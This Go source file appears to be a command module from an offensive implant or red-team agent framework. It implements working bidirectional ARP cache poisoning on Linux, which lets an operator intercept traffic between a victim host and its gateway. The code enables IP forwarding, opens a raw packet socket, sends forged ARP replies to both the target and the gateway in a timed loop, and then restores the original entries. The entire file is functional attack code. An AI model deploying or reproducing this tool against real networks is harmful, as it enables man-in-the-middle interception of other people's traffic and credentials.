//go:build linux
// +build linux

package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"syscall"
	"time"
	"unsafe"

	"fawkes/pkg/structs"
)

// executeArpSpoof performs bidirectional ARP cache poisoning on Linux.
// Sends gratuitous ARP replies to both target and gateway, positioning
// the attacker as a man-in-the-middle.
func executeArpSpoof(task structs.Task) structs.CommandResult {
	args, err := parseArpSpoofArgs(task.Params)
	if err != nil {
		return errorf("Error: %v", err)
	}

	// Resolve target and gateway MAC addresses
	targetMAC, err := resolveMAC(args.Target)
	if err != nil {
		return errorf("Error resolving target MAC: %v", err)
	}
	gatewayMAC, err := resolveMAC(args.Gateway)
	if err != nil {
		return errorf("Error resolving gateway MAC: %v", err)
	}

	// Get attacker's interface and MAC
	ifaceName := args.Interface
	if ifaceName == "" {
		ifaceName, err = getDefaultInterface()
		if err != nil {
			return errorf("Error detecting interface: %v", err)
		}
	}
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return errorf("Error: interface %s: %v", ifaceName, err)
	}
	attackerMAC := iface.HardwareAddr

	// Enable IP forwarding so traffic flows through us
	prevForward, err := enableIPForwarding()
	if err != nil {
		return errorf("Error enabling IP forwarding: %v", err)
	}

	// Open raw socket for sending ARP frames
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(etherTypeARP)))
	if err != nil {
		return errorf("Error opening raw socket: %v (requires root)", err)
	}
	defer syscall.Close(fd)

	// Bind to interface
	addr := syscall.SockaddrLinklayer{
		Protocol: htons(etherTypeARP),
		Ifindex:  iface.Index,
	}

	result := &arpSpoofResult{
		Target:       args.Target,
		Gateway:      args.Gateway,
		Interface:    ifaceName,
		AttackerMAC:  attackerMAC.String(),
		ForwardingOn: true,
	}

	// Build ARP reply frames:
	// 1. Tell target: gateway IP has attacker's MAC
	// 2. Tell gateway: target IP has attacker's MAC
	targetIP := net.ParseIP(args.Target).To4()
	gatewayIP := net.ParseIP(args.Gateway).To4()

	frameToTarget := buildARPReply(targetMAC, attackerMAC, gatewayIP, targetIP)
	frameToGateway := buildARPReply(gatewayMAC, attackerMAC, targetIP, gatewayIP)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(args.Duration)*time.Second)
	defer cancel()

	interval := time.Duration(args.Interval) * time.Second

	// Poison loop
	for {
		select {
		case <-ctx.Done():
			goto cleanup
		default:
		}

		// Send to target
		if err := syscall.Sendto(fd, frameToTarget, 0, &addr); err == nil {
			result.PacketsSent++
		} else {
			result.Errors = append(result.Errors, fmt.Sprintf("send to target: %v", err))
		}

		// Send to gateway
		if err := syscall.Sendto(fd, frameToGateway, 0, &addr); err == nil {
			result.PacketsSent++
		} else {
			result.Errors = append(result.Errors, fmt.Sprintf("send to gateway: %v", err))
		}

		select {
		case <-ctx.Done():
			goto cleanup
		case <-time.After(interval):
		}
	}

cleanup:
	// Restore original ARP entries by sending correct MAC mappings
	restoreToTarget := buildARPReply(targetMAC, gatewayMAC, gatewayIP, targetIP)
	restoreToGateway := buildARPReply(gatewayMAC, targetMAC, targetIP, gatewayIP)

	for i := 0; i < 3; i++ {
		_ = syscall.Sendto(fd, restoreToTarget, 0, &addr)
		_ = syscall.Sendto(fd, restoreToGateway, 0, &addr)
		time.Sleep(500 * time.Millisecond)
	}
	result.Restored = true

	// Restore original IP forwarding state
	restoreIPForwarding(prevForward)

	result.Duration = fmt.Sprintf("%ds", args.Duration)

	output, _ := json.Marshal(result)
	return successResult(string(output))
}

// getDefaultInterface returns the interface name of the default route.
func getDefaultInterface() (string, error) {
	conn, err := net.Dial("udp", "8.8.8.8:53")
	if err != nil {
		return "", fmt.Errorf("auto-detect interface: %w", err)
	}
	defer conn.Close()

	localIP := conn.LocalAddr().(*net.UDPAddr).IP
	ifaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}
	for _, iface := range ifaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.Equal(localIP) {
				return iface.Name, nil
			}
		}
	}
	return "", fmt.Errorf("no interface found for IP %s", localIP)
}

// enableIPForwarding enables IPv4 forwarding and returns the previous value.
func enableIPForwarding() (string, error) {
	prev, err := os.ReadFile("/proc/sys/net/ipv4/ip_forward")
	if err != nil {
		return "", fmt.Errorf("read ip_forward: %w", err)
	}
	if err := os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644); err != nil {
		return string(prev), fmt.Errorf("enable ip_forward: %w", err)
	}
	return string(prev), nil
}

// restoreIPForwarding restores the previous IP forwarding state.
func restoreIPForwarding(prev string) {
	if prev != "" {
		_ = os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte(prev), 0644)
	}
}

// htons converts a uint16 from host to network byte order.
func htons(v uint16) uint16 {
	return (v << 8) | (v >> 8)
}

// Ensure sockaddrLinklayer size is correct for sendto
var _ = unsafe.Sizeof(syscall.SockaddrLinklayer{})
